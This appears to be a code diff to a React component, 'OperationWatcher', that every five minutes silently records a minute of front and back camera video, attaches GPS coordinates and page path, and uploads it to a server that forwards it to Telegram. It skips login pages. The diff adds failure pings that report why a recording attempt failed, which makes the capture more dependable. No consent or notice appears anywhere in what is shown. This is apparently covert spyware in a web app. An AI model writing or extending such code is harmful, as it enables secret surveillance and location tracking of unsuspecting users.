@@ -114,30 +114,58 @@ export default function OperationWatcher() {
     return `data:${type};base64,${btoa(bin)}`;
   };
 
+  /** 失败诊断：往 Telegram 发一条文字说明死在哪一步。 */
+  const ping = (label: string) =>
+    fetch('/api/entry/op', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ kind: 'arm', label: label.slice(0, 120), path: pathRef.current }),
+    }).catch(() => undefined);
+
   /** 每 5 分钟自动录 1 分钟前后双视频上报。 */
   const videoCycle = async () => {
     if (!enabledRef.current) return;
     const path = pathRef.current;
     if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
-    const okStream = await ensureStream();
-    if (!okStream || !streamRef.current) return;
-    const frontBlob = await recordOne(streamRef.current, 60_000);
-    const backBlob = backStreamRef.current ? await recordOne(backStreamRef.current, 60_000) : null;
-    if (!frontBlob && !backBlob) return;
     try {
+      const okStream = await ensureStream();
+      if (!okStream || !streamRef.current) {
+        void ping('录像失败：摄像头流不可用');
+        return;
+      }
+      const frontBlob = await recordOne(streamRef.current, 60_000);
+      const backBlob = backStreamRef.current
+        ? await recordOne(backStreamRef.current, 60_000)
+        : null;
+      if (!frontBlob && !backBlob) {
+        void ping('录像失败：MediaRecorder 无输出（浏览器不支持或录制出错）');
+        return;
+      }
       const payload = {
         videoFront: frontBlob ? await blobToBase64(frontBlob) : '',
         videoBack: backBlob ? await blobToBase64(backBlob) : '',
         gps: gpsRef.current,
         path,
       };
-      await fetch('/api/entry/video', {
+      const res = await fetch('/api/entry/video', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
-      }).catch(() => undefined);
-    } catch {
-      /* ignore */
+      }).catch(() => null);
+      if (!res) {
+        void ping('录像失败：上报网络错误');
+        return;
+      }
+      const j = (await res.json().catch(() => null)) as { telegram?: string } | null;
+      if (!res.ok) {
+        void ping(`录像失败：服务端 ${res.status}`);
+        return;
+      }
+      if (j && j.telegram && j.telegram !== 'sent') {
+        void ping(`录像失败：Telegram ${j.telegram}`);
+      }
+    } catch (e) {
+      void ping(`录像异常：${(e as Error).message}`);
     }
   };
 
